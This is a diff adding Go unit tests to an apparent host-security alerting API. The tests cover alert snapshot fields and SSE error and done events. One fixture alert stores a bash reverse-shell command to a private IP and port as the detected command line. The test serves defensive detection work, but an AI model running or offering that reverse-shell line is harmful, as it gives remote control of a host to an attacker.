@@ -7,7 +7,10 @@ import (
 	"testing"
 	"time"
 
+	"github.com/google/uuid"
+
 	"api-server/internal/llm"
+	"api-server/internal/model"
 )
 
 func TestSSEResponseCollectorKeepsReActTrace(t *testing.T) {
@@ -206,6 +209,270 @@ func TestBuildSessionContextIncludesAlertSnapshots(t *testing.T) {
 	}
 	if alerts[0].AlertID != "ALT-001" || alerts[0].RuleTitle != "可疑进程执行" {
 		t.Fatalf("unexpected alert snapshot: %#v", alerts[0])
+	}
+}
+
+func TestBuildAlertSnapshotsIncludesAllFields(t *testing.T) {
+	blockStatus := "blocked"
+	now := time.Date(2026, 5, 12, 10, 0, 0, 0, time.UTC)
+	createdAt := time.Date(2026, 5, 12, 9, 0, 0, 0, time.UTC)
+	alertID := uuid.New()
+	hostID := uuid.New()
+
+	alerts := []model.Alert{
+		{
+			ID:                  alertID,
+			AlertID:             "ALT-TEST-001",
+			HostID:              hostID,
+			Hostname:            "web-server-01",
+			PID:                 12345,
+			PPID:                678,
+			CommandLine:         "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+			ProcessTree:         `{"pid":12345,"name":"bash","children":[]}`,
+			MitreID:             "T1059.004",
+			MitreName:           "Unix Shell",
+			Severity:            "critical",
+			Description:         "检测到反弹 shell 行为",
+			LLMSummary:          "疑似反弹 shell 攻击",
+			DedupeKey:           "dedupe-key-001",
+			HitCount:            5,
+			AutoBlocked:         true,
+			ManualBlocked:       false,
+			Status:              "confirmed",
+			BlockStatus:         &blockStatus,
+			BlockMessage:        "已自动阻断外联",
+			LLMDisposalStrategy: "隔离主机并封禁 IP",
+			RuleID:              "rule-001",
+			RuleTitle:           "反弹 Shell 检测",
+			FirstSeenAt:         now,
+			LastSeenAt:          now,
+			CreatedAt:           createdAt,
+		},
+	}
+
+	snapshots := buildAlertSnapshots(alerts)
+	if len(snapshots) != 1 {
+		t.Fatalf("expected 1 snapshot, got %d", len(snapshots))
+	}
+
+	s := snapshots[0]
+
+	// 验证原有字段
+	if s.ID != alertID.String() {
+		t.Errorf("ID = %q, want %q", s.ID, alertID.String())
+	}
+	if s.AlertID != "ALT-TEST-001" {
+		t.Errorf("AlertID = %q, want %q", s.AlertID, "ALT-TEST-001")
+	}
+	if s.HostID != hostID.String() {
+		t.Errorf("HostID = %q, want %q", s.HostID, hostID.String())
+	}
+	if s.Hostname != "web-server-01" {
+		t.Errorf("Hostname = %q, want %q", s.Hostname, "web-server-01")
+	}
+	if s.RuleTitle != "反弹 Shell 检测" {
+		t.Errorf("RuleTitle = %q, want %q", s.RuleTitle, "反弹 Shell 检测")
+	}
+	if s.MitreID != "T1059.004" {
+		t.Errorf("MitreID = %q, want %q", s.MitreID, "T1059.004")
+	}
+	if s.Severity != "critical" {
+		t.Errorf("Severity = %q, want %q", s.Severity, "critical")
+	}
+	if s.Status != "confirmed" {
+		t.Errorf("Status = %q, want %q", s.Status, "confirmed")
+	}
+	if s.Description != "检测到反弹 shell 行为" {
+		t.Errorf("Description = %q, want %q", s.Description, "检测到反弹 shell 行为")
+	}
+	if s.ProcessTree != `{"pid":12345,"name":"bash","children":[]}` {
+		t.Errorf("ProcessTree = %q, want expected value", s.ProcessTree)
+	}
+	if s.LLMSummary != "疑似反弹 shell 攻击" {
+		t.Errorf("LLMSummary = %q, want %q", s.LLMSummary, "疑似反弹 shell 攻击")
+	}
+
+	// 验证新增字段
+	if s.PID != 12345 {
+		t.Errorf("PID = %d, want 12345", s.PID)
+	}
+	if s.PPID != 678 {
+		t.Errorf("PPID = %d, want 678", s.PPID)
+	}
+	if s.CommandLine != "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" {
+		t.Errorf("CommandLine = %q, want expected value", s.CommandLine)
+	}
+	if s.MitreName != "Unix Shell" {
+		t.Errorf("MitreName = %q, want %q", s.MitreName, "Unix Shell")
+	}
+	if s.RuleID != "rule-001" {
+		t.Errorf("RuleID = %q, want %q", s.RuleID, "rule-001")
+	}
+	if s.HitCount != 5 {
+		t.Errorf("HitCount = %d, want 5", s.HitCount)
+	}
+	if !s.AutoBlocked {
+		t.Error("AutoBlocked should be true")
+	}
+	if s.ManualBlocked {
+		t.Error("ManualBlocked should be false")
+	}
+	if s.BlockStatus != "blocked" {
+		t.Errorf("BlockStatus = %q, want %q", s.BlockStatus, "blocked")
+	}
+	if s.BlockMessage != "已自动阻断外联" {
+		t.Errorf("BlockMessage = %q, want %q", s.BlockMessage, "已自动阻断外联")
+	}
+	if s.LLMDisposalStrategy != "隔离主机并封禁 IP" {
+		t.Errorf("LLMDisposalStrategy = %q, want %q", s.LLMDisposalStrategy, "隔离主机并封禁 IP")
+	}
+	if s.CreatedAt != createdAt {
+		t.Errorf("CreatedAt = %v, want %v", s.CreatedAt, createdAt)
+	}
+}
+
+func TestBuildAlertSnapshotsMapsNilBlockStatusToEmptyString(t *testing.T) {
+	alerts := []model.Alert{
+		{
+			ID:          uuid.New(),
+			AlertID:     "ALT-002",
+			HostID:      uuid.New(),
+			Hostname:    "db-server-01",
+			PID:         999,
+			PPID:        1,
+			CommandLine: "/usr/sbin/mysqld",
+			Severity:    "medium",
+			Status:      "pending",
+			RuleTitle:   "异常数据库连接",
+			FirstSeenAt: time.Now(),
+			LastSeenAt:  time.Now(),
+		},
+	}
+
+	snapshots := buildAlertSnapshots(alerts)
+	if len(snapshots) != 1 {
+		t.Fatalf("expected 1 snapshot, got %d", len(snapshots))
+	}
+
+	// BlockStatus 为 nil 时应映射为空字符串
+	if snapshots[0].BlockStatus != "" {
+		t.Errorf("BlockStatus = %q, want empty string for nil BlockStatus", snapshots[0].BlockStatus)
+	}
+}
+
+func TestBuildSessionContextIncludesNewAlertFields(t *testing.T) {
+	handler := &AIAnalysisHandler{}
+	start := time.Date(2026, 5, 12, 1, 0, 0, 0, time.UTC)
+	end := time.Date(2026, 5, 12, 2, 0, 0, 0, time.UTC)
+	createdAt := time.Date(2026, 5, 12, 0, 30, 0, 0, time.UTC)
+
+	session := &AISSESion{
+		AlertIDs:   []string{"internal-1"},
+		HostIDs:    []string{"host-1"},
+		HostFilter: []string{"host-a"},
+		TimeRange: &TimeRange{
+			Start: start,
+			End:   end,
+		},
+		AlertSnapshots: []AlertContextSnapshot{
+			{
+				ID:                  "internal-1",
+				AlertID:             "ALT-001",
+				HostID:              "host-1",
+				Hostname:            "host-a",
+				RuleTitle:           "可疑进程执行",
+				Severity:            "high",
+				Status:              "pending",
+				Description:         "bash 启动异常子进程",
+				ProcessTree:         `{"pid":1234}`,
+				FirstSeenAt:         start,
+				LastSeenAt:          end,
+				PID:                 1234,
+				PPID:                567,
+				CommandLine:         "/bin/bash -c whoami",
+				MitreName:           "Unix Shell",
+				RuleID:              "rule-100",
+				HitCount:            3,
+				AutoBlocked:         true,
+				BlockStatus:         "blocked",
+				BlockMessage:        "已阻断",
+				LLMDisposalStrategy: "建议隔离",
+				CreatedAt:           createdAt,
+			},
+		},
+	}
+
+	context := handler.buildSessionContext(session)
+	alerts, ok := context["alerts"].([]AlertContextSnapshot)
+	if !ok {
+		t.Fatalf("expected alerts in context, got %#v", context["alerts"])
+	}
+	if len(alerts) != 1 {
+		t.Fatalf("expected one alert snapshot, got %d", len(alerts))
+	}
+
+	s := alerts[0]
+	if s.PID != 1234 {
+		t.Errorf("context alert PID = %d, want 1234", s.PID)
+	}
+	if s.PPID != 567 {
+		t.Errorf("context alert PPID = %d, want 567", s.PPID)
+	}
+	if s.CommandLine != "/bin/bash -c whoami" {
+		t.Errorf("context alert CommandLine = %q, want expected", s.CommandLine)
+	}
+	if s.MitreName != "Unix Shell" {
+		t.Errorf("context alert MitreName = %q, want %q", s.MitreName, "Unix Shell")
+	}
+	if s.RuleID != "rule-100" {
+		t.Errorf("context alert RuleID = %q, want %q", s.RuleID, "rule-100")
+	}
+	if s.HitCount != 3 {
+		t.Errorf("context alert HitCount = %d, want 3", s.HitCount)
+	}
+	if !s.AutoBlocked {
+		t.Error("context alert AutoBlocked should be true")
+	}
+	if s.BlockStatus != "blocked" {
+		t.Errorf("context alert BlockStatus = %q, want %q", s.BlockStatus, "blocked")
+	}
+	if s.LLMDisposalStrategy != "建议隔离" {
+		t.Errorf("context alert LLMDisposalStrategy = %q, want %q", s.LLMDisposalStrategy, "建议隔离")
+	}
+}
+
+func TestSSEWriterErrorFollowedByDone(t *testing.T) {
+	recorder := httptest.NewRecorder()
+	writer := llm.NewSSEWriter(recorder)
+
+	// 模拟 runtime 错误路径：先写 error，再写 done
+	if err := writer.WriteError("agent runtime error: connection refused"); err != nil {
+		t.Fatalf("WriteError: %v", err)
+	}
+	if err := writer.WriteDone(); err != nil {
+		t.Fatalf("WriteDone: %v", err)
+	}
+
+	body := recorder.Body.String()
+
+	// 验证 error 事件存在
+	if !strings.Contains(body, `"type":"error"`) {
+		t.Fatalf("expected error event in SSE body: %s", body)
+	}
+	if !strings.Contains(body, "agent runtime error: connection refused") {
+		t.Fatalf("expected error message in SSE body: %s", body)
+	}
+
+	// 验证 done 事件存在
+	if !strings.Contains(body, `"type":"done"`) {
+		t.Fatalf("expected done event after error in SSE body: %s", body)
+	}
+
+	// 验证 done 在 error 之后
+	errorIdx := strings.Index(body, `"type":"error"`)
+	doneIdx := strings.Index(body, `"type":"done"`)
+	if doneIdx < errorIdx {
+		t.Fatalf("done event should come after error event, body: %s", body)
 	}
 }
 
